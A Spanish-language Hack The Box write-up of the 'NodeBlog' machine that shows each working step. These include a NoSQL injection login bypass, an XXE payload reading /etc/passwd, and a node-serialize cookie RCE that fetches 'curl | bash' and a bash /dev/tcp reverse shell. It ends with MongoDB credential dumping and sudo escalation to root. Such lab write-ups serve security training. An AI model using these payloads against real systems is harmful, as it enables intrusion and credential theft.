---
layout: post
title: NodeBlog
date: 2023-07-28
description:
img:
fig-caption:
tags: []
---
___

<center><img src="/writeups/assets/img/NodeBlog-htb/NodeBlog.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos



***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.139 -oG openports
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-28 13:43 GMT
Nmap scan report for 10.10.11.139
Host is up (0.11s latency).
Not shown: 64642 closed tcp ports (reset), 891 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,5000 10.10.11.139 -oN portscan
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-28 13:44 GMT
Nmap scan report for 10.10.11.139
Host is up (0.12s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
5000/tcp open  http    Node.js (Express middleware)
|_http-title: Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.56 seconds
```

## Puerto 5000 (HTTP)

Con ```whatweb``` analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.11.139:5000
http://10.10.11.139:5000 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, IP[10.10.11.139], Script[JavaScript], Title[Blog], X-Powered-By[Express], X-UA-Compatible[IE=edge]
```

La página principal se ve así:

<img src="/writeups/assets/img/NodeBlog-htb/1.png" alt="">

Tengo acceso a un panel de autenticación


Intercepto la petición con ```BurpSuite``` para ver como se tramita

```null
POST /login HTTP/1.1
Host: 10.10.11.139:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 23
Origin: http://10.10.11.139:5000
DNT: 1
Connection: close
Referer: http://10.10.11.139:5000/login
Upgrade-Insecure-Requests: 1

user=test&password=test
```

Es vulnerable a inyección NoSQL

```null
POST /login HTTP/1.1
Host: 10.10.11.139:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 51
Origin: http://10.10.11.139:5000
DNT: 1
Connection: close
Referer: http://10.10.11.139:5000/login
Upgrade-Insecure-Requests: 1

{"user":{"$ne": "test"},"password":{"$ne": "test"}}
```

<img src="/writeups/assets/img/NodeBlog-htb/2.png" alt="">

Gano acceso a otra interfaz

<img src="/writeups/assets/img/NodeBlog-htb/3.png" alt="">

La sección de editar artículos es vulnerable a una inyección XML. Sin embargo, desde aquí no lo puedo derivar a un XXE

<img src="/writeups/assets/img/NodeBlog-htb/4.png" alt="">

<img src="/writeups/assets/img/NodeBlog-htb/5.png" alt="">

Pruebo a subir un archivo pero recibo un error. La data tiene que estar en XML. Se muestra un ejemplo

<img src="/writeups/assets/img/NodeBlog-htb/6.png" alt="">

Consigo ver el ```/etc/passwd``` a través de un XXE

```null
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<post>
  <title>&example;</title>
  <description>&example;</description>
  <markdown>&example;</markdown>
</post>
```

<img src="/writeups/assets/img/NodeBlog-htb/7.png" alt="">

Produzco un error al iniciar sesión para que se leakee la ruta donde se encuentra montado el servicio

```null
{"user":{adsf}}
```

<img src="/writeups/assets/img/NodeBlog-htb/8.png" alt="">

Teniendo la ruta ```/opt/blog``` traigo el ```server.js```

```null
const express = require(&#39;express&#39;)
const mongoose = require(&#39;mongoose&#39;)
const Article = require(&#39;./models/article&#39;)
const articleRouter = require(&#39;./routes/articles&#39;)
const loginRouter = require(&#39;./routes/login&#39;)
const serialize = require(&#39;node-serialize&#39;)
const methodOverride = require(&#39;method-override&#39;)
const fileUpload = require(&#39;express-fileupload&#39;)
const cookieParser = require(&#39;cookie-parser&#39;);
const crypto = require(&#39;crypto&#39;)
const cookie_secret = &#34;UHC-SecretCookie&#34;
//var session = require(&#39;express-session&#39;);
const app = express()

mongoose.connect(&#39;mongodb://localhost/blog&#39;)

app.set(&#39;view engine&#39;, &#39;ejs&#39;)
app.use(express.urlencoded({ extended: false }))
app.use(methodOverride(&#39;_method&#39;))
app.use(fileUpload())
app.use(express.json());
app.use(cookieParser());
//app.use(session({secret: &#34;UHC-SecretKey-123&#34;}));

function authenticated(c) {
    if (typeof c == &#39;undefined&#39;)
        return false

    c = serialize.unserialize(c)

    if (c.sign == (crypto.createHash(&#39;md5&#39;).update(cookie_secret + c.user).digest(&#39;hex&#39;)) ){
        return true
    } else {
        return false
    }
}


app.get(&#39;/&#39;, async (req, res) =&gt; {
    const articles = await Article.find().sort({
        createdAt: &#39;desc&#39;
    })
    res.render(&#39;articles/index&#39;, { articles: articles, ip: req.socket.remoteAddress, authenticated: authenticated(req.cookies.auth) })
})

app.use(&#39;/articles&#39;, articleRouter)
app.use(&#39;/login&#39;, loginRouter)


app.listen(5000)
```

Se aplica deserialización de la cookie de sesión. En [Hacktricks](https://book.hacktricks.xyz/pentesting-web/deserialization#node-serialize) explican como ejecutar comandos a través de node-js. Creo un archivo index.html que se encargue de enviarme una reverse shell

```null
catr index.html
bash -c 'bash -i >& /dev/tcp/10.10.16.69/443 0>&1'
```

Con curl lo traigo al servidor y ejecuto en el servidor

```null
echo 'curl 10.10.16.69 | bash' | base64 -w 0; echo
Y3VybCAxMC4xMC4xNi42OSB8IGJhc2gK
```

```null
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('echo cGluZyAtYyAxIDEwLjEwLjE2LjY5Cg== |base64 -d|bash', function(error, stdout, stderr){console.log(stdout)});}()"}
```

La cookie tiene que estar en formato URL-Encode (Para todos los caracteres)

```null
Cookie: auth=%7b%22%72%63%65%22%3a%22%5f%24%24%4e%44%5f%46%55%4e%43%24%24%5f%66%75%6e%63%74%69%6f%6e%28%29%7b%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%65%63%68%6f%20%59%33%56%79%62%43%41%78%4d%43%34%78%4d%43%34%78%4e%69%34%32%4f%53%42%38%49%47%4a%68%63%32%67%4b%20%7c%62%61%73%65%36%34%20%2d%64%7c%62%61%73%68%27%2c%20%66%75%6e%63%74%69%6f%6e%28%65%72%72%6f%72%2c%20%73%74%64%6f%75%74%2c%20%73%74%64%65%72%72%29%7b%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%73%74%64%6f%75%74%29%7d%29%3b%7d%28%29%22%7d
```

Recibo la petición a mi equipo

```null
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.139 - - [28/Jul/2023 14:36:58] "GET / HTTP/1.1" 200 -
```

Gano acceso al sistema

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.69] from (UNKNOWN) [10.10.11.139] 46080
bash: cannot set terminal process group (860): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

bash: /home/admin/.bashrc: Permission denied
admin@nodeblog:/opt/blog$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

bash: /home/admin/.bashrc: Permission denied
admin@nodeblog:/opt/blog$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
admin@nodeblog:/opt/blog$ export TERM=xterm-color
admin@nodeblog:/opt/blog$ stty rows 55 columns 209
admin@nodeblog:/opt/blog$ source /etc/skel/.bashrc 
```

Me conecto ```MongoDB```

```null
admin@nodeblog:~$ mongo
MongoDB shell version v3.6.8
connecting to: mongodb://127.0.0.1:27017
Implicit session: session { "id" : UUID("a7ddf806-b25a-468c-82cb-56bb4581de90") }
MongoDB server version: 3.6.8
Server has startup warnings: 
2023-07-28T09:32:26.397+0000 I CONTROL  [initandlisten] 
2023-07-28T09:32:26.397+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
2023-07-28T09:32:26.397+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
2023-07-28T09:32:26.397+0000 I CONTROL  [initandlisten] 
```

Listo las bases de datos

```null
> show dbs
admin   0.000GB
blog    0.000GB
config  0.000GB
local   0.000GB
```

Para ```blog```, las tablas

```null
> use blog
switched to db blog
> show collections
articles
users
```

Dumpeo los datos

```null
> db.users.find()
{ "_id" : ObjectId("61b7380ae5814df6030d2373"), "createdAt" : ISODate("2021-12-13T12:09:46.009Z"), "username" : "admin", "password" : "IppsecSaysPleaseSubscribe", "__v" : 0 }
```

Corresponde a la contraseña de ```admin``` a nivel de sistema. Puedo convertirme en ```root```, ya que en en ```sudoers``` está establecida una regla, por la cual puedo ejecutar cualquier comando como cualquier usuario

```null
admin@nodeblog:~$ sudo -l
[sudo] password for admin: 
Matching Defaults entries for admin on nodeblog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on nodeblog:
    (ALL) ALL
    (ALL : ALL) ALL
admin@nodeblog:~$ sudo su
root@nodeblog:/home/admin# 
```

Puedo ver las flag

```null
root@nodeblog:/home/admin# cat user.txt 
cd8717f2ac7b818be3224c5cdf086653
root@nodeblog:/home/admin# cat /root/root.txt 
533ea3e89c2b8d6f8765a80c4c4bacc8
```